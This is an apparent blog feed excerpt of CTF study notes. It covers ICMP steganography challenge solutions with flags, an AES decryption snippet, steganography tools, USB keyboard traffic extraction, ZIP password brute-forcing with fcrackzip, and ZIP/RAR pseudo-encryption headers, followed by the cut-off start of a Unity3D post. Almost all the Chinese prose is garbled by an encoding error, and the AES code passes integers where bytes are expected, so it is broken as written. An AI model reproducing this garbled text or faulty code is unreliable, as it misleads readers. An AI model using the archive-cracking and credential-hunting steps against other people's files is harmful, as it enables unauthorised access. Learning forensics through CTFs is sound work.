æœï¼Œå†é€ä¸ªå®¡è®¡ï¼Œå‘ç°å¹¶æ²¡æœ‰ç›´æ¥çš„å­—ç¬¦å­˜åœ¨ã€‚è”ç³»é¢˜ç›®<strong>lenth</strong>ï¼Œå‘ç°æ¯ä¸ªDataçš„å­—ç¬¦ä¸²é•¿åº¦éƒ½ä¸ä¸€æ ·ï¼Œè®°å½•æ¯ä¸ªå­—ç¬¦</p><p><a href="https://ramoor.github.io/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/9.png"><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/9.png"></a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">99</span> <span class="hljs-number">116</span> <span class="hljs-number">102</span> <span class="hljs-number">104</span> <span class="hljs-number">117</span> <span class="hljs-number">98</span> <span class="hljs-number">123</span> <span class="hljs-number">97</span> <span class="hljs-number">99</span> <span class="hljs-number">98</span> <span class="hljs-number">54</span> <span class="hljs-number">53</span> <span class="hljs-number">57</span> <span class="hljs-number">102</span> <span class="hljs-number">48</span> <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">125</span><br></code></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºASCIIå­—ç¬¦,å¾—åˆ°flag</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">ctfhub&#123;acb<span class="hljs-number">659f023</span>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç ”ç©¶å­¦ä¹ ï¼š</strong></p><p>åˆ†æDataéƒ¨åˆ†çš„é•¿åº¦å¯å˜ï¼Œå› è€Œèƒ½å¤Ÿéšè—ä¿¡æ¯</p><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="6ï¼‰LengthBinary-ICMP"><a href="#6ï¼‰LengthBinary-ICMP" class="headerlink" title="6ï¼‰LengthBinary (ICMP)"></a>6ï¼‰LengthBinary (ICMP)</h4><p><strong>é¢˜ç›®ï¼š</strong></p><p>ping åŒ…çš„å¤§å°æœ‰äº›å¥‡æ€ª</p><p><strong>ä¸ªäººæ€è·¯ï¼š</strong></p><p>ç”¨Wiresharkæ‰“å¼€ï¼Œå‘ç°Dataéƒ¨åˆ†çš„é•¿åº¦ä¸ä¸€ï¼Œä½†åªæœ‰ä¸¤ç§é•¿åº¦ï¼Œç»“åˆé¢˜ç›®çŒœæµ‹ï¼Œè¾ƒé•¿çš„Dataéƒ¨åˆ†ä»£è¡¨1ï¼Œè¾ƒçŸ­çš„ä»£è¡¨0ï¼Œè®°å½•ä¸‹æ¥ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">011000110111010001100110011010000111010101100010011110110011000000110100011001010110011001100101011001000011000101100101001100000011010101111101<br></code></pre></td></tr></table></figure><p>è½¬æˆå­—ç¬¦ä¸²ï¼Œä¾¿å¾—åˆ°flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">04</span>efed1e05&#125;<br></code></pre></td></tr></table></figure><p><strong>ç ”ç©¶å­¦ä¹ ï¼š</strong></p><p>ä»ç„¶æ˜¯åˆ©ç”¨Dataéƒ¨åˆ†é•¿åº¦å¯å˜éšè—ä¿¡æ¯</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‡æœŸCTFå­¦ä¹ è®°å½•</title>
    <link href="/2025/01/15/%E5%81%87%E6%9C%9FCTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/01/15/%E5%81%87%E6%9C%9FCTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Cryptoï¼š"><a href="#Cryptoï¼š" class="headerlink" title="Cryptoï¼š"></a>Cryptoï¼š</h1><h3 id="ä¸€ã€æ¨¡è¿ç®—"><a href="#ä¸€ã€æ¨¡è¿ç®—" class="headerlink" title="ä¸€ã€æ¨¡è¿ç®—"></a>ä¸€ã€æ¨¡è¿ç®—</h3><ul><li><strong>äºŒé¡¹å¼å®šç†</strong>ï¼š</li></ul><blockquote><span>$$ (x+y)^n=(^n_0)x^ny^0+(^n_1)x^{n-1}y^1+...+(^n_{n-1})x^1y^{n-1}+(^n_n)x^0y^n $$</span></blockquote><blockquote><p>é’ˆå¯¹<strong>RSA</strong>ï¼š$N&#x3D;p*q$</p><p>$x&#x3D;(ap+bq)^n&#x3D;(ap)^n+(bq)^n \mod n$</p></blockquote><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="äºŒã€AES"><a href="#äºŒã€AES" class="headerlink" title="äºŒã€AES"></a>äºŒã€AES</h3><p><strong>Pythonä¸­çš„ç®€å•å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å®ç°AES</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><br><br>key        = <span class="hljs-string">b&#x27;\xc3,\\\xa6\xb5\x80^\x0c\xdb\x8d\xa5z*\xb6\xfe\\&#x27;</span><br>ciphertext =<span class="hljs-number">0x61646d696e3d54727565303030303030</span><span class="hljs-comment">#b&#x27;\xd1O\x14j\xa4+O\xb6\xa1\xc4\x08B)\x8f\x12\xdd&#x27;</span><br>iv=<span class="hljs-number">0x8b14b5d74ac2c280b443bbbed84ea8c2</span><br><span class="hljs-comment">#å¡«å……</span><br><span class="hljs-comment">#padded_data = pad(data, AES.block_size)</span><br><br><br>decipher=AES.new(key,AES.MODE_CBC,iv)<br>plaintext=decipher.decrypt(ciphertext)<br><br><span class="hljs-built_in">print</span>(plaintext)<br><br><span class="hljs-string">&quot;&quot;&quot; # è§£å¯†éœ€è¦ä½¿ç”¨ç›¸åŒçš„å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡ (IV)</span><br><span class="hljs-string">iv = cipher.iv  # åŠ å¯†æ—¶ç”Ÿæˆçš„IV</span><br><span class="hljs-string"></span><br><span class="hljs-string"># åˆ›å»ºè§£å¯†å™¨</span><br><span class="hljs-string">decipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># è§£å¯†</span><br><span class="hljs-string">decrypted_data = unpad(decipher.decrypt(ciphertext), AES.block_size) &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="ä¸‰ã€å·¥ä½œæ¨¡å¼ï¼ˆCBC-ECB-OFB-CFB-CTRï¼‰"><a href="#ä¸‰ã€å·¥ä½œæ¨¡å¼ï¼ˆCBC-ECB-OFB-CFB-CTRï¼‰" class="headerlink" title="ä¸‰ã€å·¥ä½œæ¨¡å¼ï¼ˆCBC,ECB,OFB,CFB,CTRï¼‰"></a>ä¸‰ã€å·¥ä½œæ¨¡å¼ï¼ˆCBC,ECB,OFB,CFB,CTRï¼‰</h3><ul><li><p>ECBä¸éœ€è¦IVï¼Œéœ€è¦çŸ­å—å¤„ç†</p></li><li><p>CBCéœ€è¦çŸ­å—å¤„ç†</p></li><li><p>OFBï¼ŒCFBï¼ŒCTRæ˜¯æŠŠæ˜æ–‡è½¬æˆå¯†é’¥æµä¸æ˜æ–‡å¼‚æˆ–è¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤æ²¡æœ‰çŸ­å—é—®é¢˜</p></li></ul><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h1><h3 id="ä¸€ã€å›¾ç‰‡é¢˜"><a href="#ä¸€ã€å›¾ç‰‡é¢˜" class="headerlink" title="ä¸€ã€å›¾ç‰‡é¢˜"></a>ä¸€ã€å›¾ç‰‡é¢˜</h3><ul><li><strong>LSB</strong>éšå†™</li></ul><blockquote><p>1ã€ åˆ©ç”¨Stegsolveä½ä½é€šé“è§£å†³</p></blockquote><blockquote><p>2ã€ <strong>å¸¦å¯†ç çš„LSBéšå†™ï¼š</strong> åœ¨kaliä¸­ä½¿ç”¨<strong>cloacked-pixel</strong>ä¸­åˆ†ç¦»å‡ºéšè—ä¿¡æ¯ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 lsb<span class="hljs-selector-class">.py</span> extract xxx<span class="hljs-selector-class">.png</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><ul><li><p>éšå«<strong>æ–‡ä»¶</strong>ï¼Œåˆ©ç”¨<strong>binwalk</strong>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨éšå«æ–‡ä»¶ï¼Œå†åˆ©ç”¨<strong>dd</strong>æŒ‡ä»¤æˆ–<strong>forecast</strong>æŒ‡ä»¤æ¥åˆ†ç¦»å‡ºéšè—çš„æ–‡ä»¶</p></li><li><p>å¦ä¸€ç§å›¾ç‰‡éšå«<strong>æ–‡ä»¶</strong>ï¼Œåˆ©ç”¨<strong>steghide</strong>åˆ†ç¦»éšè—çš„æ–‡ä»¶</p></li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>steghide extract -sf xx.jpg<br></code></pre></td></tr></table></figure><ul><li><p><strong>exif</strong>éšå†™ï¼Œåœ¨kaliä¸­ä½¿ç”¨<strong>exiftool</strong>å·¥å…·æå–éšè—ä¿¡æ¯</p></li><li><p><strong>F5</strong>éšå†™ï¼Œkaliç¯å¢ƒä¸­ä½¿ç”¨F5-steganography-master</p></li><li><p><strong>CRC</strong>æ ¡éªŒï¼ˆæœ‰å¯èƒ½å‡ºç°zlibï¼‰ï¼Œåœ¨010Editorä¸­æ‰¾åˆ°CRCï¼Œä½¿ç”¨è„šæœ¬è®¡ç®—æ­£ç¡®çš„<strong>å®½åº¦</strong>å’Œ<strong>é«˜åº¦</strong></p></li><li><p><strong>gif</strong>åŠ¨å›¾ï¼š</p></li></ul><blockquote><p>ä¸€ã€47 49 46 38å¼€å¤´</p><p>äºŒã€æ”¾è¿›Stegsolveä¸­æå–æ¯å¸§åŠ¨ç”»</p></blockquote><h3 id="äºŒã€æµé‡åˆ†æ"><a href="#äºŒã€æµé‡åˆ†æ" class="headerlink" title="äºŒã€æµé‡åˆ†æ"></a>äºŒã€æµé‡åˆ†æ</h3><ul><li>åˆ©ç”¨<strong>WireShark</strong>åˆ†ææµé‡åŒ…ï¼Œå†å¯¹è¯¦ç»†æ•°æ®è¿›è¡Œè¿‡æ»¤</li></ul><blockquote><p>http POST&#x2F;GET ç­‰</p></blockquote><ul><li><p>åˆ†æå…³äº<strong>TCP</strong>çš„æµé‡åŒ…ï¼Œä½¿ç”¨<strong>WireShark</strong>ä¸­çš„TCPæµé‡è¿½è¸ª</p></li><li><p>å¯»æ‰¾<strong>ç”¨æˆ·å¯†ç </strong>ï¼Œéœ€è¦æ‰¾åˆ°**.dmp**æ–‡ä»¶å</p></li></ul><blockquote><p>ï¼ˆ*dmpæ–‡ä»¶æ˜¯windowsç³»ç»Ÿä¸­çš„é”™è¯¯è½¬å‚¨æ–‡ä»¶ï¼Œå½“Windowså‘ç”Ÿé”™è¯¯è“å±çš„æ—¶å€™ï¼Œç³»ç»Ÿå°†å½“å‰å†…å­˜ã€å«è™šæ‹Ÿå†…å­˜ã€‘ä¸­çš„æ•°æ®ç›´æ¥å†™åˆ°æ–‡ä»¶ä¸­å»ï¼Œæ–¹ä¾¿å®šä½æ•…éšœåŸå› ã€‚ï¼‰</p></blockquote><blockquote><p>ï¼ˆ*é‡Œé¢åŒ…å«ä¸»æœºç”¨æˆ·å¯†ç ä¿¡æ¯ï¼‰</p></blockquote><ul><li>å¯¹äº<strong>USB</strong>æµé‡åŒ…ï¼Œä½¿ç”¨<strong>UsbKeyboardDataHacker</strong>è„šæœ¬æå–å†…å®¹</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> UsbKeyboardDataHacker.<span class="hljs-keyword">py</span> --<span class="hljs-built_in">input</span> xxx.pcap<br></code></pre></td></tr></table></figure><ul><li><strong>å®½å¸¦æ•°æ®æ³„éœ²</strong>ï¼Œä½¿ç”¨<strong>RoutePassView</strong>æŸ¥æ‰¾ç”¨æˆ·åæˆ–å¯†ç </li></ul><h3 id="ä¸‰ã€å‹ç¼©æ–‡ä»¶"><a href="#ä¸‰ã€å‹ç¼©æ–‡ä»¶" class="headerlink" title="ä¸‰ã€å‹ç¼©æ–‡ä»¶"></a>ä¸‰ã€å‹ç¼©æ–‡ä»¶</h3><ul><li>å¯†ç <strong>çˆ†ç ´</strong></li></ul><blockquote><p><strong>Kali</strong>ä¸­ï¼šä½¿ç”¨<strong>fcrackzip</strong>å·¥å…·ï¼ˆZIPå‹ç¼©æ–‡ä»¶ï¼‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c <span class="hljs-number">1</span> -l <span class="hljs-number">4</span>-<span class="hljs-number">5</span> -u xxx.png  <br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ä¸­ï¼šä½¿ç”¨<strong>ARCHPR</strong>å·¥å…·ï¼ˆZIPï¼ŒRARç­‰å‹ç¼©æ–‡ä»¶ï¼‰</p></blockquote><ul><li><strong>CRC</strong>çˆ†ç ´ï¼š</li></ul><blockquote><p>ä½¿ç”¨pyè„šæœ¬çˆ†ç ´</p></blockquote><ul><li>ä¼ªåŠ å¯†ï¼ˆZIPï¼‰ï¼š</li></ul><p><strong>a.å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š</strong></p><blockquote><p>50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰<br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br>09 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®° ï¼ˆ<strong>æœ‰æ— åŠ å¯†</strong>ï¼‰<br>08 00ï¼šå‹ç¼©æ–¹å¼<br>50 A3ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´<br>A5 4Aï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ<br>21 38 76 64ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰<br>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰<br>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰<br>08 00ï¼šæ–‡ä»¶åé•¿åº¦<br>00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦</p></blockquote><p><strong>b.å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº:</strong></p><blockquote><p>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50)<br>1F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬<br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br>09 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆ<strong>æ˜¯å¦æ˜¯åŠ å¯†</strong>ï¼‰<br>08 00ï¼šå‹ç¼©æ–¹å¼<br>50 A3ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´<br>A5 4Aï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ<br>21 38 76 65ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰<br>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰<br>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰<br>08 00ï¼šæ–‡ä»¶åé•¿åº¦<br>24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦<br>00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦<br>00 00ï¼šç£ç›˜å¼€å§‹å·<br>00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§<br>20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§<br>00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡</p></blockquote><p><strong>c.å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—:</strong></p><blockquote><p>50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®°<br>00 00ï¼šå½“å‰ç£ç›˜ç¼–å·<br>00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å·<br>01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•°<br>01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•°<br>5A 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å°<br>3F 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡<br>00 00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</p></blockquote><ul><li>ä¼ªåŠ å¯†ï¼ˆRARï¼‰</li></ul><blockquote><p>ç»“æ„å¦‚ä¸‹<br>RAR 5.0ç­¾åç”±8ä¸ªå­—èŠ‚ç»„æˆ:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00<br>æ¯”è¾ƒä¸€ä¸‹<br>RAR 4.x ç­¾åç”±7å­—èŠ‚ç»„æˆ:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x00</p></blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">D5<span class="hljs-number"> 56 </span>ï¼šHEAD_CRCï¼Œ2å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶å¤´éƒ¨åˆ†çš„crcæ ¡éªŒå€¼<br>74 ï¼šHEAD_TYPEï¼Œ1å­—èŠ‚ï¼Œå—ç±»å‹ï¼Œ74è¡¨ç¤ºå—ç±»å‹æ˜¯æ–‡ä»¶å¤´<br>20<span class="hljs-number"> 90 </span>ï¼šHEAD_FLAGSï¼Œ2å­—èŠ‚ï¼Œä½æ ‡è®°ï¼Œè¿™å—åœ¨èµ„æ–™ä¸Šæ²¡æ‰¾åˆ°å¯¹åº”çš„æ•°å€¼ï¼Œä¸çŸ¥é“20 90ä»£è¡¨ä»€ä¹ˆæ„æ€ã€‚<br>2D<span class="hljs-number"> 00 </span>ï¼šHEAD_SIZEï¼Œ2å­—èŠ‚ï¼Œæ–‡ä»¶å¤´çš„å…¨éƒ¨å¤§å°ï¼ˆåŒ…å«æ–‡ä»¶åå’Œæ³¨é‡Šï¼‰<br>10<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>ï¼šPACK_SIZEï¼Œ4å­—èŠ‚ï¼Œå·²å‹ç¼©æ–‡ä»¶å¤§å°<br>10<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>ï¼šUNP_SIZEï¼Œ4å­—èŠ‚ï¼Œæœªå‹ç¼©æ–‡ä»¶å¤§å°<br>02ï¼šHOST_OSï¼Œ1å­—èŠ‚ï¼Œä¿å­˜å‹ç¼©æ–‡ä»¶ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œ02ä»£è¡¨windows<br>C7<span class="hljs-number"> 88 </span>67 36ï¼šFILE_CRCï¼Œ4å­—èŠ‚ï¼Œæ–‡ä»¶çš„CRCå€¼<br>6D BB 4E 4B ï¼šFTIMEï¼Œ4å­—èŠ‚ï¼ŒMS DOS æ ‡å‡†æ ¼å¼çš„æ—¥æœŸå’Œæ—¶é—´<br>1Dï¼šUNP_VERï¼Œ1å­—èŠ‚ï¼Œè§£å‹æ–‡ä»¶æ‰€éœ€è¦çš„æœ€ä½RARç‰ˆæœ¬<br>30ï¼šMETHODï¼Œ1å­—èŠ‚ï¼Œå‹ç¼©æ–¹å¼ï¼Œè¿™é‡Œæ˜¯å­˜å‚¨å‹ç¼©<br>08<span class="hljs-number"> 00 </span>ï¼šNAME_SIZEï¼Œ2å­—èŠ‚ï¼Œè¡¨ç¤ºæ–‡ä»¶åå¤§å°ï¼Œè¿™é‡Œæ–‡ä»¶åå¤§å°æ˜¯8å­—èŠ‚ï¼ˆflag.txtï¼‰<br>20<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>ï¼šATTRï¼Œ4å­—èŠ‚ï¼Œè¡¨ç¤ºæ–‡ä»¶å±æ€§è¿™é‡Œæ˜¯txtæ–‡ä»¶<br>66 6C<span class="hljs-number"> 61 </span>67 2E<span class="hljs-number"> 74 </span>78 74ï¼šFILE_NAMEï¼ˆæ–‡ä»¶åï¼‰ ï¼ŒNAME_SIZEå­—èŠ‚å¤§å°ï¼Œè¿™é‡ŒNAME_SIZEå¤§å°ä¸º8<br>å†å¾€åæ˜¯txtæ–‡ä»¶å†…å®¹ï¼Œä¸€ç›´åˆ°ç¬¬å…­è¡Œ<span class="hljs-number"> 65 </span>ç»“æŸï¼Œä¸‹é¢æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶å—çš„å¼€å§‹<br><br>è¿™ä¸ªå—ä¸­å­˜åœ¨ä¸¤ä¸ªcrcå€¼ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶å¤´å—ä¸­ä»å—ç±»å‹åˆ°æ–‡ä»¶åè¿™38ä¸ªå­—èŠ‚çš„æ ¡éªŒï¼Œåä¸€ä¸ªåˆ™æ˜¯å‹ç¼©åŒ…ä¸­æ‰€åŒ…å«æ–‡ä»¶çš„crcæ ¡éªŒï¼Œè§£å‹æ—¶ï¼Œä¼šè®¡ç®—è§£å‹åç”Ÿæˆæ–‡ä»¶çš„crcå€¼ï¼Œå¦‚æœç­‰äºè¿™é‡Œçš„crcï¼Œåˆ™è§£å‹å®Œæˆï¼Œå¦‚æœä¸åŒï¼Œåˆ™æŠ¥é”™ä¸­æ–­ã€‚<br></code></pre></td></tr></table></figure><blockquote><ol><li><p>æ‰¾åˆ°ç¬¬24ä¸ªå­—èŠ‚ï¼Œè¯¥å­—èŠ‚å°¾æ•°ä¸º4è¡¨</p></li><li><p>ç¤ºåŠ å¯†ï¼Œ0è¡¨ç¤ºæ— åŠ å¯†ï¼Œå°†å°¾æ•°æ”¹ä¸º0å³å¯ç ´è§£ä¼ªåŠ å¯†.</p></li></ol></blockquote><h3 id="å››ã€éŸ³é¢‘é¢˜"><a href="#å››ã€éŸ³é¢‘é¢˜" class="headerlink" title="å››ã€éŸ³é¢‘é¢˜"></a>å››ã€éŸ³é¢‘é¢˜</h3><ul><li><p>å°†<strong>MAV</strong>ç­‰éŸ³é¢‘æ–‡ä»¶æ”¾å…¥<strong>Audacity</strong>ä¸­åˆ†æï¼Œå¦‚æ‘©æ–¯ç”µç </p></li><li><p>å°†<strong>MAV</strong>ç­‰éŸ³é¢‘æ–‡ä»¶æ”¾å…¥<strong>dtmf2num</strong>ä¸­åˆ†æï¼ˆ<strong>ç”µè¯æ•°å­—å·ç </strong>ï¼‰ï¼Œä»£ç å¦‚ä¸‹ï¼š</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./dtmf2num.exe girlfriend.wav<br></code></pre></td></tr></table></figure><h3 id="äº”ã€æ–‡æ¡£é¢˜"><a href="#äº”ã€æ–‡æ¡£é¢˜" class="headerlink" title="äº”ã€æ–‡æ¡£é¢˜"></a>äº”ã€æ–‡æ¡£é¢˜</h3><ul><li>Txtæ–‡æ¡£<strong>ntfséšå†™</strong>ï¼š</li></ul><p>1ã€‘åœ¨éšå†™æ–‡æ¡£çš„ç›®å½•ä¸‹æ‰“å¼€cmdå‘½ä»¤è¡Œï¼Œè¾“å…¥ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">notepad</span> <span class="hljs-number">1</span>.txt:flag.txt<br></code></pre></td></tr></table></figure><p>2ã€‘åœ¨<strong>ntfsstreamseditor</strong>ä¸­æ‰«æï¼Œå°½é‡ä½¿ç”¨<strong>Winrarè§£å‹</strong></p><blockquote><p>å‡ºç°<strong>pyc</strong>æ–‡ä»¶çš„è¯ï¼šä½¿ç”¨<strong>uncompyle</strong>åæ±‡ç¼–</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">uncompyle6 xxx<span class="hljs-selector-class">.pyc</span> &gt; <span class="hljs-selector-tag">main</span>.py<br></code></pre></td></tr></table></figure><p><strong>æˆ–</strong></p><p>åœ¨çº¿å·¥å…·åç¼–è¯‘</p></blockquote><ul><li>Docxæ–‡æ¡£éšå†™ï¼šåœ¨æ–‡ä»¶-&gt;é€‰é¡¹-&gt;æ˜¾ç¤º-&gt;é€‰ä¸­æ˜¾ç¤ºéšè—æ–‡å­—</li></ul><h3 id="å…­ã€è§†é¢‘é¢˜"><a href="#å…­ã€è§†é¢‘é¢˜" class="headerlink" title="å…­ã€è§†é¢‘é¢˜"></a>å…­ã€è§†é¢‘é¢˜</h3><ul><li>ä½¿ç”¨<strong>Kinovea</strong>æ‰“å¼€è§†é¢‘æ–‡ä»¶ï¼ˆè¦æ±‚è§†é¢‘æ–‡ä»¶çš„è·¯å¾„ä¸Šæ²¡æœ‰ä¸­æ–‡ï¼‰ï¼Œè¿›è¡Œæ¯å¸§åˆ†æ</li></ul><h3 id="ä¸ƒã€é•œåƒæ–‡ä»¶"><a href="#ä¸ƒã€é•œåƒæ–‡ä»¶" class="headerlink" title="ä¸ƒã€é•œåƒæ–‡ä»¶"></a>ä¸ƒã€é•œåƒæ–‡ä»¶</h3><ul><li>åœ¨<strong>Kali</strong>ä¸­ç”¨<strong>Foremost</strong>åˆ†ç¦»</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¾ˆå¯æƒœï¼Œå¯’å‡é‡Œæ€»æ˜¯æœ‰ç§ç§ä¸å¯é¿å…çš„äº‹ï¼Œå› æ­¤å­¦åˆ°çš„å†…å®¹æœ‰é™ï¼Œä½†æˆ‘ä¹Ÿæœ‰å¾ˆå¤šæ”¶è·ï¼Œåªèƒ½è¯´ï¼Œ2025ç»§ç»­åŠªåŠ›ï¼ï¼</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unity3D</title>
    <link href="/2024/12/04/Unity3D/"/>
    <url>/2024/12/04/Unity3D/</url>
    
    <content type="html"><![CDATA[<h1 id="Unity-Cardboard-XRåº”ç”¨éƒ¨ç½²ï¼ˆä»¥åä¸ºæ‰‹æœºä¸ºä¾‹ï¼‰"><a href="#Unity-Cardboard-XRåº”ç”¨éƒ¨ç½²ï¼ˆä»¥åä¸ºæ‰‹æœºä¸ºä¾‹ï¼‰" class="headerlink" title="Unity Cardboard XRåº”ç”¨éƒ¨ç½²ï¼ˆä»¥åä¸ºæ‰‹æœºä¸ºä¾‹ï¼‰"></a>Unity Cardboard XRåº”ç”¨éƒ¨ç½²ï¼ˆä»¥åä¸ºæ‰‹æœºä¸ºä¾‹ï¼‰</h1><h2 id="1ã€åˆ›å»ºé¡¹ç›®"><a href="#1ã€åˆ›å»ºé¡¹ç›®" class="headerlink" title="1ã€åˆ›å»ºé¡¹ç›®"></a>1ã€åˆ›å»ºé¡¹ç›®</h2><p>æˆ‘è¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯2022ï¼Œéœ€è¦æ·»åŠ Androidæ¨¡å—ï¼Œå¯é€šè¿‡ä¸‹å›¾æ–¹å¼æ·»åŠ ã€‚</p><p><img src="/2024/12/04/Unity3D/1.png"></p><p>æ¥ä¸‹æ¥åˆ›å»º3Dé¡¹ç›®.</p><h2 